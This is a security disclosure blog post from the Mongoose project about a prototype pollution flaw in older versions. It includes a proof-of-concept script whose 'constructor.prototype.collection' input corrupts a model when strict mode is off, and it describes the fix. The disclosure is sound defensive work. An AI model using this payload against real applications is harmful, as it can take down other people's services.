In August, [the Node.js Security Group found a security vulnerability](https://twitter.com/mongoosejs/status/1035212908232200192) affecting all versions of Mongoose before 5.2.12 and 4.13.17. We released a [fix](https://github.com/Automattic/mongoose/blob/master/History.md#5212--2018-08-30) on August 30 and encouraged everyone to upgrade via [Twitter](https://twitter.com/mongoosejs/status/1035212908232200192), our [Slack channel](http://slack.mongoosejs.io/), and our [Gitter chat](https://gitter.im/Automattic/mongoose). [HackerOne recently released a formal disclosure](https://hackerone.com/bugs?report_id=390860&subject=user) of this issue on November 30. This blog post constitutes Mongoose's [full disclosure after a period of responsible disclosure](https://en.wikipedia.org/wiki/Responsible_disclosure). In this article, I'll describe the vulnerability and how Mongoose patched it.

_TLDR: Upgrade to Mongoose `5.2.12` if you're on 5.x, or `4.13.17` if you're still on 4.x, especially if you disable [strict mode](https://mongoosejs.com/docs/guide.html#strict)._

Prototype Pollution
-------------------

In most JavaScript runtimes, every JavaScript object has [an `__proto__` property](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto) that points to its [constructor's prototype](https://www.w3schools.com/js/js_object_prototypes.asp).

```
$ node
> const x = {};
undefined
> x.prototype;
undefined
> x.__proto__;
{}
> x.__proto__ === Object.prototype;
true
>
```

The `__proto__` property is controversial and the [Mozilla docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto) consider it deprecated. However, JavaScript objects also have a well-accepted [`constructor` property](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor) that points to this object's constructor. That means `x.constructor.prototype` is essentially equivalent to `x.__proto__`:

```
$ node
> x.constructor.prototype;
{}
> x.constructor.prototype === Object.prototype;
true
> x.constructor.prototype === x.__proto__;
true
>
```

These properties are dangerous because potentially malicious user data can leak into your implementation logic. For example, it is perfectly valid to overwrite the `constructor` property with `x.constructor = 'foo'`, but then your application logic cannot rely on `x.constructor`.

[Mongoose schemas](https://mongoosejs.com/docs/guide.html) exist to protect against this and other potentially dangerous naming conflicts. However, if you [disable `strict` mode in your schemas](https://mongoosejs.com/docs/guide.html#strict), Mongoose versions before 5.2.12 and 4.13.17 would let user data access `__proto__` and `constructor`, and potentially overwrite it. This means a malicious user could send some bad data that would corrupt the entire model and make all future operations on that model fail until the process was restarted. Below is a stript `disclosure.js` that demonstrates this vulnerability.

```javascript
const assert = require('assert');
const mongoose = require('mongoose');

const connectionString = `mongodb://localhost:27017/test`;
const { Schema } = mongoose;

run().then(() => console.log('done')).catch(error => console.error('Caught', error.stack));

async function run() {
  await mongoose.connect(connectionString, { useNewUrlParser: true });
  await mongoose.connection.dropDatabase();

  console.log('Mongoose version', mongoose.version);

  // This issue only happens if `strict` is set to `false`.
  const disabledStrictSchema = new mongoose.Schema({}, { strict: false });
  const Model = mongoose.model('Test', disabledStrictSchema);

  // Mongoose < 5.2.12 will overwrite the prototype
  const doc = new Model({ 'constructor.prototype.collection': null });

  // This will throw an error
  try {
    await doc.save();
  } catch(error) {
    console.log('Caught', error.message); // "Caught BSON field 'OperationSessionInfo.lsid.collection' is an unknown field."
  }

  // This will too. The malformed data corrupts the whole model
  try {
    await Model.create({});
  } catch (error) {
    console.log('Caught', error.message); // "Caught BSON field 'OperationSessionInfo.lsid.collection' is an unknown field."
  }
}
```

Below is the output of running the above script against Mongoose 5.2.10:

```
$ node disclosure.js
Caught BSON field 'OperationSessionInfo.lsid.collection' is an unknown field.
Caught BSON field 'OperationSessionInfo.lsid.collection' is an unknown field.
done
^C
$
```

Note that strict mode is enabled by default, so you are only affected by this issue if you explicitly set `strict: false`.

Mongoose's Patch
----------------

We added a [list of special properties internally](https://github.com/Automattic/mongoose/commit/fb8b644b7ffdd2799f23bb2d8dd1ba875ec8323a) that Mongoose will always refuse to [`set()`](https://mongoosejs.com/docs/api.html#document_Document-set). This will ensure that any time you create a new [Mongoose document](https://mongoosejs.com/docs/documents.html), Mongoose will silently ignore any updates to `__proto__`, `constructor`, and `prototype`, even if strict mode is disabled. Below is the output of running the `disclosure.js` script against Mongoose 5.3.14:

```
$ node disclosure.js
Mongoose version 5.3.14
done
^C
$
```

This patch prevents overwriting special properties on nested objects as well. Even if `constructor` isn't the first part of the path, being updated, Mongoose will strip it out:

```javascript
const assert = require('assert');
const mongoose = require('mongoose');

const connectionString = `mongodb://localhost:27017/test`;
const { Schema } = mongoose;

run().then(() => console.log('done')).catch(error => console.error('Caught', error.stack));

async function run() {
  await mongoose.connect(connectionString, { useNewUrlParser: true });
  await mongoose.connection.dropDatabase();

  console.log('Mongoose version', mongoose.version);

  const nestedSchema = new mongoose.Schema({}, { strict: false, _id: false });
  const disabledStrictSchema = new mongoose.Schema({ nested: nestedSchema }, { strict: false });
  const Model = mongoose.model('Test', disabledStrictSchema);

  const doc = new Model({ 'nested.constructor.prototype.collection': null });

  // `doc.nested` is an empty object
  console.log(doc);

  // Saves successfully
  await doc.save();
}
```

Moving On
---------

[Prototype pollution](https://ponyfoo.com/articles/how-to-avoid-objectprototype-pollution) is a dangerous pitfall, and it is [not uncommon](https://hackerone.com/reports/310443). We're looking into better ways to safeguard against this type of issue, like [`Object.freeze()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze) and using [ES6 symbols for internal properties](https://github.com/Automattic/mongoose/commit/b6c81977e896f288bec38b177a455a4f88fa9ecd). If you have any questions or need any help upgrading, please reach out on [GitHub issues](https://github.com/Automattic/mongoose/issues/new) or [Mongoose's Slack channel](http://slack.mongoosejs.io/).
